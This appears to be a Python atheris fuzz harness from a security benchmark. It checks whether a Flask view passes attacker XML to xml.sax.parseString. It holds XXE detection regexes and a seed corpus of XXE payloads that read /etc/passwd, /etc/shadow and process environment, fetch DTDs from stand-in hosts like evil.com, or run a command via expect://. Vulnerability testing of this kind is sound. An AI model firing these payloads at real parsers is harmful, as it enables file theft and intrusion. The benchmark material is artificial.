import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock


import xml.sax


with atheris.instrument_imports():

    from testcode.BenchmarkTest00540 import BenchmarkTest00540_post


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("<!DOCTYPE[^>]*\\[", re.IGNORECASE),

    re.compile("<!ENTITY[^>]+SYSTEM\\s+['\"]", re.IGNORECASE),

    re.compile("<!ENTITY[^>]+PUBLIC\\s+['\"]", re.IGNORECASE),

    re.compile("SYSTEM\\s+['\"](?:file://|http://|https://|ftp://|php://|expect://)", re.IGNORECASE),

    re.compile("<!\\[CDATA\\[.*\\]\\]>", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY/XXE: XML external entity injection detected — external entities enabled and malicious DOCTYPE/ENTITY reached the parser — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "param", "index": -1, "type": "str"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : patch_call
# patch_target     : xml.sax.parseString
# target_arg_index : 0
# target_arg_name  : None
# input_strategy   : flask_view
# signature        : def BenchmarkTest00540_post(self)
# condition        : The XML string passed to the parser contains a DOCTYPE declaration with an external entity SYSTEM reference, indicating an XXE payload is being parsed with external entities enabled
# capture_what     : The XML string argument passed to xml.sax.parseString, checked for external entity declarations
# skip_hint        : False
# ========================================


_SEED_CORPUS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "public" "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://attacker.com/evil">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/file">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE Foo [<!ENTITY bar SYSTEM "file:///proc/self/environ">]><Foo>&bar;</Foo>',
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><test/>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
]


def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)

    # INPUT GENERATION — single tainted param of type str
    param = fdp.ConsumeUnicodeNoSurrogates(len(data))

    # Build a mock Flask request with the fuzzed param
    mock_request = MagicMock()
    mock_request.form.get.return_value = param
    mock_request.args.get.return_value = param
    mock_request.values.get.return_value = param

    # Build a mock self (Flask view instance)
    mock_self = MagicMock()

    # MOCK SETUP — patch xml.sax.parseString
    with patch("xml.sax.parseString") as mock_parse:
        mock_parse.return_value = MagicMock()

        # Also patch flask.request so the view function picks up our param
        with patch("testcode.BenchmarkTest00540.request", mock_request):
            try:
                BenchmarkTest00540_post(mock_self)
            except RuntimeError:
                raise
            except Exception:
                pass

        # ORACLE CHECK — outside function call try/except, inside patch context
        for call in mock_parse.call_args_list:
            # Extract the first argument (the XML string/bytes passed to parseString)
            captured = None
            if call.args:
                captured = call.args[0]
            elif call.kwargs:
                captured = call.kwargs.get("string")

            if captured is None:
                continue

            captured_str = captured.decode("utf-8", errors="replace") if isinstance(captured, (bytes, bytearray)) else str(captured)

            for pattern in _COMPILED_PATTERNS:
                match = pattern.search(captured_str)
                if match:
                    raise RuntimeError(
                        _RAISE_MESSAGE.format(
                            captured=captured_str,
                            matched_pattern=pattern.pattern
                        )
                    )


if __name__ == "__main__":
    _CORPUS_DIR = os.path.join(os.path.dirname(__file__), "fuzz_corpus")
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()